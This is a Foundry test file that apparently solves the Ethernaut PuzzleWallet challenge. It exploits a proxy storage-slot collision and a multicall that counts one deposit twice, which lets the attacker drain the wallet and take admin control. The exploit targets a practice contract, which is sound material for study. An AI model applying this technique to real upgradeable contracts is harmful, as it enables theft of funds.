// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {PuzzleWallet, PuzzleProxy} from "../src/PuzzleWallet.sol";

contract PuzzleWalletTest is Test {
    PuzzleWallet internal puzzleWallet;
    PuzzleProxy internal puzzleProxy;
    PuzzleWallet internal puzzleProxyAsWallet;
    address internal attacker;

    function setUp() public {
        attacker = address(0x1);
        puzzleWallet = new PuzzleWallet();
        bytes memory initData = abi.encodeWithSignature("init(uint256)", 100);
        puzzleProxy = new PuzzleProxy(address(this), address(puzzleWallet), initData);
        puzzleProxyAsWallet = PuzzleWallet(address(puzzleProxy));

        puzzleProxyAsWallet.addToWhitelist(address(this));
        puzzleProxyAsWallet.deposit{value: 1000000000000000}();

        vm.deal(attacker, 10 ether);
    }

    function test_Attack() public {
        vm.startPrank(attacker);

        puzzleProxy.proposeNewAdmin(attacker);
        puzzleProxyAsWallet.addToWhitelist(attacker);

        bytes[] memory data = new bytes[](2);
        bytes[] memory nestedData = new bytes[](1);
        nestedData[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        data[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        data[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, nestedData);

        puzzleProxyAsWallet.multicall{value: 1000000000000000}(data);

        puzzleProxyAsWallet.execute(attacker, 2000000000000000, "");

        puzzleProxyAsWallet.setMaxBalance(uint160(attacker));

        assertEq(puzzleProxy.admin(), attacker);

        vm.stopPrank();
    }
}
